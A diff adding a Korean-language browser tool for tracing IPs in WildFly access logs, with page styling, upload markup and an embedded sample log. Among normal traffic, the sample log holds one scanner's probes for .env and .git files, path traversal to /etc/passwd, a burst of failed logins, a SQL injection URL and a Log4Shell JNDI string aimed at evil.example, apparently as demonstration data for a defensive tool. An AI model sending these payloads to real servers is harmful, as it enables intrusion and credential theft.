@@ -1,0 +1,815 @@
+<title>WildFly IP 추적기</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+KR:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: 상단 업로드 띠 → 왼쪽 IP 목록 / 오른쪽 선택 IP 보고서(요약 → 타임테이블 → 조치 → 상세) */
+:root{
+  --bg:#f5f7f7; --panel:#ffffff; --fg:#17201f; --mut:#5b6b69; --line:#d9e1e0;
+  --accent:#0f6e66; --accent-soft:#e1efed;
+  --hi:#c0352b; --mid:#b26b00; --lo:#2f7d3b;
+  --heat:15,110,102; --heat-bad:192,53,43;
+  --f-body:"IBM Plex Sans KR",system-ui,"Apple SD Gothic Neo","Malgun Gothic",sans-serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"Consolas",monospace;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0f1514; --panel:#161e1d; --fg:#e4ecea; --mut:#93a5a2; --line:#2a3634;
+  --accent:#4fbfb3; --accent-soft:#16312e; --hi:#f0776c; --mid:#e0a43a; --lo:#6cc27a;
+  --heat:79,191,179; --heat-bad:240,119,108; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#0f1514; --panel:#161e1d; --fg:#e4ecea; --mut:#93a5a2; --line:#2a3634;
+  --accent:#4fbfb3; --accent-soft:#16312e; --hi:#f0776c; --mid:#e0a43a; --lo:#6cc27a;
+  --heat:79,191,179; --heat-bad:240,119,108; color-scheme:dark}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font:14px/1.55 var(--f-body)}
+.wrap{max-width:1280px;margin:0 auto;padding-block:20px 48px;
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));
+  display:flex;flex-direction:column;gap:16px}
+h1{font-size:20px;margin:0;text-wrap:balance} h2{font-size:15px;margin:0 0 8px;text-wrap:balance}
+.mono{font-family:var(--f-mono)} .mut{color:var(--mut)} .num{font-variant-numeric:tabular-nums}
+.head{display:flex;flex-wrap:wrap;gap:8px 16px;align-items:baseline;justify-content:space-between}
+.drop{border:1.5px dashed var(--line);border-radius:10px;background:var(--panel);padding:16px;
+  display:flex;flex-wrap:wrap;gap:12px;align-items:center;transition:border-color .15s,background .15s}
+.drop.over{border-color:var(--accent);background:var(--accent-soft)}
+.drop p{margin:0;flex:1 1 280px;min-width:0}
+button,.btn{font:inherit;border:1px solid var(--line);background:var(--panel);color:var(--fg);border-radius:6px;padding:6px 12px;cursor:pointer}
+button.primary,.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--panel)}
+button:focus-visible,input:focus-visible,.btn:focus-within{outline:2px solid var(--accent);outline-offset:2px}
+input[type=text]{font:inherit;font-family:var(--f-mono);border:1px solid var(--line);background:var(--panel);color:var(--fg);border-radius:6px;padding:6px 10px;min-width:0;width:100%}
+.badge{display:inline-block;font-size:12px;padding:1px 8px;border-radius:999px;background:var(--accent-soft);color:var(--accent)}
+.badge.example{background:var(--mid);color:var(--panel)}
+.files{font-size:12px;display:flex;flex-wrap:wrap;gap:6px;width:100%}
+.files span{font-family:var(--f-mono);border:1px solid var(--line);border-radius:4px;padding:0 6px}
+.main{display:grid;grid-template-columns:300px minmax(0,1fr);gap:16px;align-items:start}
+@media (max-width:820px){.main{grid-template-columns:minmax(0,1fr)}}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px;min-width:0}
+.iplist{display:flex;flex-direction:column;gap:2px;max-height:560px;overflow:auto;margin-top:8px}
+.iprow{display:grid;grid-template-columns:10px minmax(0,1fr) auto;gap:8px;align-items:center;text-align:left;border:0;border-radius:6px;padding:6px 8px;background:transparent}
+.iprow:hover{background:var(--accent-soft)} .iprow.on{background:var(--accent-soft);box-shadow:inset 0 0 0 1px var(--accent)}
+.dot{width:10px;height:10px;border-radius:50%} .dot.hi{background:var(--hi)} .dot.mid{background:var(--mid)} .dot.lo{background:var(--lo)}
+.iprow .ip{font-family:var(--f-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.iprow small{color:var(--mut);font-variant-numeric:tabular-nums}
+.report{display:flex;flex-direction:column;gap:16px;min-width:0}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.stat{background:var(--panel);padding:10px 12px;min-width:0}
+.stat span{display:block;font-size:12px;color:var(--mut);letter-spacing:.02em}
+.stat b{display:block;font-size:17px;font-variant-numeric:tabular-nums;overflow-wrap:anywhere}
+.risk{display:flex;gap:12px;align-items:flex-start;border-left:4px solid var(--lo)}
+.risk.hi{border-left-color:var(--hi)} .risk.mid{border-left-color:var(--mid)}
+.risk .lvl{font-size:22px;font-weight:700;white-space:nowrap}
+.risk.hi .lvl{color:var(--hi)} .risk.mid .lvl{color:var(--mid)} .risk.lo .lvl{color:var(--lo)}
+.risk ul{margin:0;padding-left:18px}
+.scroll{overflow-x:auto}
+table{border-collapse:collapse;width:100%}
+.grid td,.grid th{border:1px solid var(--line);font-size:11px;padding:0;text-align:center;font-variant-numeric:tabular-nums}
+.grid th{font-weight:500;color:var(--mut);padding:2px 4px}
+.grid th.day{text-align:left;white-space:nowrap;padding:2px 8px;color:var(--fg)}
+.grid td button{all:unset;display:block;width:100%;min-width:28px;height:26px;line-height:26px;cursor:pointer;color:var(--fg)}
+.grid td button:focus-visible{outline:2px solid var(--accent)}
+.grid td.bad{box-shadow:inset 0 0 0 2px rgb(var(--heat-bad))}
+.grid td.sel{box-shadow:inset 0 0 0 2px var(--fg)}
+.legend{display:flex;flex-wrap:wrap;gap:14px;font-size:12px;color:var(--mut);margin-top:8px}
+.legend i{display:inline-block;width:14px;height:14px;vertical-align:-2px;margin-right:4px;border-radius:2px}
+.actions{display:flex;flex-direction:column;gap:10px;margin:0;padding:0;list-style:none}
+.actions li{display:flex;flex-direction:column;gap:6px}
+pre{margin:0;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;font:12px/1.6 var(--f-mono);overflow-x:auto;white-space:pre}
+.cmd{display:flex;gap:6px;align-items:flex-start} .cmd pre{flex:1;min-width:0}
+.detail td,.detail th{border-bottom:1px solid var(--line);padding:5px 6px;font-size:12px;text-align:left;vertical-align:top}
+.detail th{color:var(--mut);font-weight:500;position:sticky;top:0;background:var(--panel)}
+.detail .w{overflow-wrap:anywhere;font-family:var(--f-mono)}
+.detail .t{white-space:nowrap;font-variant-numeric:tabular-nums}
+.tag{display:inline-block;font-size:11px;border-radius:4px;padding:0 5px;margin:0 3px 2px 0;background:var(--accent-soft);color:var(--accent)}
+.tag.warn{background:rgba(var(--heat-bad),.14);color:var(--hi)}
+.s4{color:var(--mid)} .s5{color:var(--hi)}
+.detailbox{max-height:520px;overflow:auto}
+.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:space-between;margin-bottom:8px}
+.note{font-size:12px;color:var(--mut)}
+.empty{padding:24px;text-align:center;color:var(--mut)}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<div class="wrap">
+  <div class="head">
+    <h1>WildFly IP 추적기</h1>
+    <span class="note">파일은 이 브라우저 안에서만 읽습니다. 서버로 전송되지 않습니다.</span>
+  </div>
+
+  <label class="drop" id="drop" for="file">
+    <p><b>로그 파일을 여기로 끌어다 놓거나</b> 버튼으로 선택하세요.<br>
+      <span class="mut">access_log.*.log, server.log, .gz 압축 파일 · 여러 개 동시 선택 가능</span></p>
+    <span class="btn primary">파일 선택</span>
+    <input id="file" type="file" multiple hidden accept=".log,.txt,.gz,text/plain">
+    <div class="files" id="files"></div>
+  </label>
+
+  <div class="main">
+    <aside class="panel">
+      <h2>IP 목록 <span class="mut num" id="ipcount"></span></h2>
+      <input type="text" id="ipq" placeholder="IP 또는 대역 입력 (예: 203.0.113.0/24)" aria-label="IP 검색">
+      <div class="note" style="margin-top:6px">대역(/24 등)을 입력하고 Enter를 누르면 대역 전체를 합쳐서 봅니다.</div>
+      <div class="iplist" id="iplist"></div>
+    </aside>
+    <section class="report" id="report"></section>
+  </div>
+</div>
+
+<script type="text/plain" id="sample-access">192.168.10.35 - - [19/Oct/2026:08:02:08 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:08:06:40 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:08:19:19 +0900] "POST /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:08:23:21 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:08:30:03 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:08:51:59 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:08:56:18 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:09:03:59 +0900] "POST /app/static/main.css HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:09:09:25 +0900] "POST /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [19/Oct/2026:09:13:02 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:09:16:39 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:09:17:30 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:09:27:26 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:09:35:45 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:09:37:36 +0900] "POST /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:09:41:29 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:09:48:35 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:09:52:32 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:09:59:30 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:10:00:31 +0900] "POST /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [19/Oct/2026:10:15:15 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:10:25:41 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:10:25:44 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:10:26:29 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:10:34:07 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:10:44:49 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:10:44:54 +0900] "POST /app/ HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:10:47:33 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:11:00:31 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:11:02:35 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [19/Oct/2026:11:09:05 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:11:14:47 +0900] "POST /app/static/main.css HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:11:15:32 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:11:17:27 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:11:26:04 +0900] "POST /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [19/Oct/2026:11:38:52 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:11:43:31 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [19/Oct/2026:11:49:18 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:11:58:59 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:12:00:09 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:12:02:38 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:12:06:03 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:12:16:23 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [19/Oct/2026:12:18:17 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:12:26:03 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [19/Oct/2026:12:41:36 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:12:46:09 +0900] "GET /app/api/items HTTP/1.1" 304 512
+10.0.5.8 - - [19/Oct/2026:12:47:16 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:13:04:25 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:13:07:53 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:13:09:59 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:13:10:39 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:13:14:31 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:13:16:41 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:13:26:43 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:13:32:55 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:13:37:03 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:13:38:31 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:13:50:27 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:13:53:25 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:14:04:30 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:14:06:50 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:14:31:45 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:14:53:28 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:14:56:42 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.21 - - [19/Oct/2026:14:58:55 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:15:09:18 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:15:16:51 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:15:25:35 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:15:29:49 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:15:43:34 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:15:51:04 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:15:56:52 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:16:17:45 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [19/Oct/2026:16:25:25 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:16:27:03 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:16:31:56 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:16:34:20 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:16:40:27 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:16:43:15 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:17:03:36 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:17:04:07 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:17:04:23 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:17:05:32 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [19/Oct/2026:17:15:20 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:17:33:54 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:17:40:41 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:17:48:08 +0900] "POST /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [19/Oct/2026:17:51:57 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [19/Oct/2026:17:52:40 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [19/Oct/2026:17:59:29 +0900] "GET /app/api/items HTTP/1.1" 200 512
+203.0.113.45 - - [20/Oct/2026:02:13:02 +0900] "GET /.env HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:04 +0900] "GET /.git/config HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:06 +0900] "GET /wp-admin/ HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:08 +0900] "GET /manager/html HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:10 +0900] "GET /console HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:12 +0900] "GET /jmx-console/ HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:14 +0900] "GET /phpmyadmin/ HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:16 +0900] "GET /app/../../etc/passwd HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:18 +0900] "GET /cgi-bin/test.php HTTP/1.1" 404 74
+203.0.113.45 - - [20/Oct/2026:02:13:19 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:20 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:21 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:22 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:23 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:24 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:25 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:26 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:27 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:28 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:29 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:30 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:31 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:32 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:33 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:34 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:35 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:36 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:37 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:38 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:39 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:40 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:41 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:42 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:43 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:44 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:45 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:46 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:47 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:48 +0900] "POST /app/login HTTP/1.1" 401 0
+203.0.113.45 - - [20/Oct/2026:02:13:51 +0900] "GET /app/search?q=1%27%20union%20select%20password%20from%20users-- HTTP/1.1" 500 0
+203.0.113.45 - - [20/Oct/2026:02:13:54 +0900] "GET /app/?x=${jndi:ldap://evil.example/a} HTTP/1.1" 400 0
+192.168.10.21 - - [20/Oct/2026:08:36:09 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:08:50:17 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:08:51:46 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:08:55:49 +0900] "GET /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:08:58:30 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.21 - - [20/Oct/2026:09:14:06 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:09:19:33 +0900] "POST /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:09:24:31 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:09:24:38 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:09:25:59 +0900] "POST /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:09:36:39 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:09:39:46 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:09:44:54 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:09:46:10 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:09:51:46 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:09:52:05 +0900] "GET /app/api/items HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:09:53:22 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:09:54:31 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:09:57:45 +0900] "POST /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:09:59:46 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:10:07:21 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:10:08:00 +0900] "GET /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:10:22:27 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:10:35:12 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:10:37:57 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [20/Oct/2026:10:38:00 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:10:41:10 +0900] "GET /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:10:51:30 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:10:56:31 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:11:11:25 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:11:12:17 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.21 - - [20/Oct/2026:11:12:33 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:11:18:32 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:11:19:30 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:11:30:56 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:11:50:06 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:12:05:09 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:12:19:16 +0900] "POST /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:12:21:48 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:12:22:38 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:12:32:58 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:12:33:40 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:12:37:15 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:12:51:36 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:12:57:15 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:13:07:09 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:13:09:35 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:13:13:30 +0900] "POST /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:13:18:10 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:13:35:05 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:13:49:14 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:13:51:41 +0900] "GET /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:13:55:28 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:13:57:39 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:14:03:12 +0900] "GET /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:14:10:50 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:14:13:00 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:14:19:54 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:14:23:36 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:14:26:47 +0900] "POST /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:14:45:48 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:14:55:12 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:15:32:28 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:15:39:46 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:15:42:37 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:15:53:44 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:16:01:48 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:16:08:10 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:16:09:33 +0900] "POST /app/ HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:16:14:28 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
